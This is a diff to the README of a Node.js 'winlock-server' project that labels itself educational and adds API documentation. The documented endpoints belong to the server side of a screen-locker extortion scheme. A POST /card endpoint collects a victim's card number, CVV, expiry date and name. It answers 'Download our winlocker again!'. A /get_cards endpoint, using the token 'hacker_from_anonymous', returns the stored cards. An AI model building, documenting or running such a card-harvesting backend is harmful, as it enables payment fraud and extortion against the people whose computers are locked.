@@ -12,7 +12,7 @@
 
 </div>
 
-### Installation:
+## Installation:
 -   Install [Node.js](https://nodejs.org/en/),
 -   Clone this repo: `git clone https://github.com/Ythosa/whynote`,
 -   Install dependences by writing in console: `npm install`,
@@ -20,7 +20,7 @@
 
 <br>
 
-### Description:
+## Description:
 -    Opensource Server on `Node.js` for Winlock Development Practice;
 -    Designed for educational purposes only, the author is not responsible for how you use it;
 -    The `winlock-server` can:
@@ -30,5 +30,108 @@
 
 <br>
 
-### Documentation: 
--   ...
+## Documentation: 
+
+### Http request to check the map and save it to the database:
+
+~-~ Request sample:
+
+``` javascript
+var raw = JSON.stringify({
+  "digits":"4111111111111111",
+  "cvv":"111",
+  "date":"M/YY",
+  "owner":"Sername Name"
+});
+
+var requestOptions = {
+  method: 'POST',
+  headers: myHeaders,
+  body: raw,
+  redirect: 'follow'
+};
+
+fetch("http://localhost:3000/card", requestOptions)
+  .then(response => response.text())
+  .then(result => console.log(result))
+  .catch(error => console.log('error', error));
+  
+  ```
+  
+~-~ Response sample: 
+
+```javascript
+{
+    "ok": true,
+    "message": "Successful! Download our winlocker again!"
+}
+```
+
+### Http request to get cards from BD:
+
+~-~ Request sample:
+
+```javascript 
+var raw = JSON.stringify({"token":"hacker_from_anonymous"});
+
+var requestOptions = {
+  method: 'POST',
+  headers: myHeaders,
+  body: raw,
+  redirect: 'follow'
+};
+
+fetch("http://localhost:3000/get_cards", requestOptions)
+  .then(response => response.text())
+  .then(result => console.log(result))
+  .catch(error => console.log('error', error));
+```
+
+~-~ Response sample:
+
+```
+[
+{
+"digits": "4111111111111111",
+"cvv": "111",
+"date": "M/YY",
+"owner": "SERNAME NAME",
+"card_details_error": null
+}
+]
+```
+
+### Http request to get server information:
+
+~-~ Request sample:
+
+```javascript
+var requestOptions = {
+  method: 'GET',
+  redirect: 'follow'
+};
+
+fetch("http://localhost:3000/", requestOptions)
+  .then(response => response.text())
+  .then(result => console.log(result))
+  .catch(error => console.log('error', error));
+```
+
+~-~ Response sample:
+
+```html
+<!DOCTYPE html>
+<html>
+
+<head>
+	<title>Winlock API Say BB ur PC bruh xd</title>
+	<link rel="stylesheet" href="/stylesheets/style.css">
+</head>
+
+<body>
+	<h1>Winlock API Say BB ur PC bruh xd</h1>
+	<p>Welcome to Winlock API Say BB ur PC bruh xd</p>
+</body>
+
+</html>
+```
